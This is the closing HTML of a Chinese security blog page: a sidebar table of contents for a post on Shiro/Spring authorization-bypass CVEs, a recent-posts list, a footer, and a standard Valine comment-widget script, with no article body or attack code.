defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/ARP%E6%94%BB%E5%87%BB/"><img class="next-cover" src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ARP攻击</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">micgo</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">48</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">38</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/micgo520"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#MVC%E6%A1%86%E6%9E%B6"><span class="toc-number">1.</span> <span class="toc-text">MVC框架</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Servlet"><span class="toc-number">2.</span> <span class="toc-text">Servlet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SpringBoot"><span class="toc-number">3.</span> <span class="toc-text">SpringBoot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B"><span class="toc-number">4.</span> <span class="toc-text">威胁模型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat"><span class="toc-number">5.</span> <span class="toc-text">Tomcat</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass-Tricks"><span class="toc-number">5.1.</span> <span class="toc-text">Bypass Tricks</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#removeSemicolonContentInternal"><span class="toc-number">6.</span> <span class="toc-text">removeSemicolonContentInternal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%89%B4%E6%9D%83%E6%A1%88%E4%BE%8B"><span class="toc-number">7.</span> <span class="toc-text">鉴权案例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#starts-x2F-endswith"><span class="toc-number">7.1.</span> <span class="toc-text">starts&#x2F;endswith</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%90OA"><span class="toc-number">7.2.</span> <span class="toc-text">某OA</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#alwaysUseFullPath"><span class="toc-number">8.</span> <span class="toc-text">alwaysUseFullPath</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SuffixPatternMatch-x2F-TrailingSlashMatch-%E5%90%8E%E7%BC%80-x2F-%E7%BB%93%E5%B0%BE%E5%8C%B9%E9%85%8D%E6%A8%A1%E5%BC%8F"><span class="toc-number">9.</span> <span class="toc-text">SuffixPatternMatch&#x2F;TrailingSlashMatch(后缀&#x2F;结尾匹配模式)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring-security-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-number">10.</span> <span class="toc-text">Spring-security 认证绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-5007"><span class="toc-number">10.1.</span> <span class="toc-text">CVE-2016-5007</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2022-22978"><span class="toc-number">10.2.</span> <span class="toc-text">CVE-2022-22978</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87"><span class="toc-number">11.</span> <span class="toc-text">shiro权限绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2010-3863"><span class="toc-number">11.1.</span> <span class="toc-text">CVE-2010-3863</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-6802"><span class="toc-number">11.2.</span> <span class="toc-text">CVE-2016-6802</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-1957"><span class="toc-number">11.3.</span> <span class="toc-text">CVE-2020-1957</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-11989"><span class="toc-number">11.4.</span> <span class="toc-text">CVE-2020-11989</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-13933"><span class="toc-number">11.5.</span> <span class="toc-text">CVE-2020-13933</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-17510"><span class="toc-number">11.6.</span> <span class="toc-text">CVE-2020-17510</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-17523"><span class="toc-number">11.7.</span> <span class="toc-text">CVE-2020-17523</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2021-41303"><span class="toc-number">11.8.</span> <span class="toc-text">CVE-2021-41303</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2022-32532"><span class="toc-number">11.9.</span> <span class="toc-text">CVE-2022-32532</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2023-22602"><span class="toc-number">11.10.</span> <span class="toc-text">CVE-2023-22602</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2023-34478"><span class="toc-number">11.11.</span> <span class="toc-text">CVE-2023-34478</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2023-46749"><span class="toc-number">11.12.</span> <span class="toc-text">CVE-2023-46749</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fuzz"><span class="toc-number">11.13.</span> <span class="toc-text">fuzz</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F/%E9%89%B4%E6%9D%83/" title="Shiro/Spring权限绕过">Shiro/Spring权限绕过</a><time datetime="2024-02-27T16:00:00.000Z" title="发表于 2024-02-28 00:00:00">2024-02-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/ARP%E6%94%BB%E5%87%BB/" title="ARP攻击">ARP攻击</a><time datetime="2023-11-04T16:00:00.000Z" title="发表于 2023-11-05 00:00:00">2023-11-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/WiFi%E6%94%BB%E5%87%BB/" title="WiFi攻击">WiFi攻击</a><time datetime="2023-10-31T16:00:00.000Z" title="发表于 2023-11-01 00:00:00">2023-11-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%9D%82/%E4%BB%A3%E7%90%86%20/" title="正向代理与反向代理">正向代理与反向代理</a><time datetime="2023-10-01T16:00:00.000Z" title="发表于 2023-10-02 00:00:00">2023-10-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/" title="逻辑漏洞测试">逻辑漏洞测试</a><time datetime="2023-09-27T16:00:00.000Z" title="发表于 2023-09-28 00:00:00">2023-09-28</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By micgo</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '2t5fYJ95Y61Dyi4xHc3dWgxl-gzGzoHsz',
+      appKey: 'UNfGz5zfJGeNX6LS5OyiymLm',
+      avatar: 'monsterid',
+      serverURLs: 'https://2t5fyj95.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
